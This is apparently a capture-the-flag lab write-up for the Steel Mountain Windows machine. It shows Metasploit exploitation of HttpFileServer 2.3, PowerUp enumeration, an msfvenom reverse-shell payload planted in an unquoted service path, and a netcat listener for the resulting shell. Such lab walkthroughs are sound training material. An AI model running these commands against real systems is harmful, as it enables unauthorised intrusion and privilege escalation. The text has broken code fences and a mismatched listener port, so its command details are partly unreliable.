# Steel Mountain Writeup

## Let’s start

```shell
$ nmap -sV <machine-ip>

```

Notice the `HttpFileServer` running on port `8080`. It’s version is `2.3`, can we exploit it?

```shell
kali@kali:~$ searchsploit "Http File Server"

Seems like we have a vulnerable version on our hands! Let’s go for metasploit!

```shell
$ msfconsole
msf5 > search "HttpFileServer"

Success!! Let’s explore!

```shell
meterpreter > cd C:/Users/bill/Desktop
meterpreter > cat user.txt
```

And we get the user flag. :) 

## Enumerating
To enumerate this machine, we will use a powershell script called PowerUp, that’s purpose is to evaluate a Windows machine and determine any abnormalities. PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. You can download the script  [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) .
 Now you can use the upload command in Metasploit to upload the script.

```shell
kali@kali:~$ mkdir windows_scripts && cd windows_scripts
kali@kali:~$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
--2020-06-20 13:21:21--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
meterpreter > upload windows_scripts/PowerUp.ps1
``` 

To execute this using Meterpreter, I will type `load powershell` into meterpreter. Then I will enter powershell by entering `powershell_shell`.

```shell
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
[*] Running Invoke-AllChecks
...
```

Take close attention to the **CanRestart** option that is set to true. What is the name of the unquoted service path service name?
`AdvancedSystemCareService9`

The **CanRestart** option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program! Let’s use **msfvenom** to exploit this.

```shell
# In another tab in our comnputer
$ msfvenom -p windows/shell_reverse_tcp LHOST=<our-machine-ip> LPORT=4444 -e x86/shikata_ga_nai -f exe -o Advanced.exe

# Back to metasploit
meterpreter > cd C:/Program Files (x86)/IOBit
meterpreter > upload Advanced.exe
```

If you’ve gotten to this point and are somewhat confused about what Unquoted Service Paths are, that’s ok.  In a nutshell, USP are a misconfiguration in a directory’s path that contains spaces in which the path isn’t encapsulated in double quotations.  If the path to an executable is “quoted,” the path is specifically defined in the machine and not open to interpretation usually.  If the path is not quoted, then you can maliciously insert executables in to the “spaces.”  This  [link ](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae) provides a pretty good overview of what is going on to cause these vulnerabilities.  

From here we need to determine the locations within the service path that can be exploited.  We see that in this case we could try C:\Program Files (x86), and try to inject something named Program.exe, but we likely do not have permission to do so.  However we know that we have permission to modify the service as we have privileges to run it (StartName: LocalSystem).

Now that we know that we have privileges, and that we have a possible path to inject our malicious executable in to, we need to craft it.  We can use msfvenom to do this.  Keep note that the service path we are targeting is Advanced SystemCare, so we will need to name our malicious executable “Advanced.exe” as this is what the system will attempt to run first. 

Now let’s exploit it.

```shell
# In another bash tab
$ nc -nlvp 4443 # Port that will set with msfvenom

# In metasploit
meterpreter > shell
windows shell > sc stop AdvancedSystemCareService9
windows shell > sc start AdvancedSystemCareService9

# We should have a reverse shell on out netcat!
```
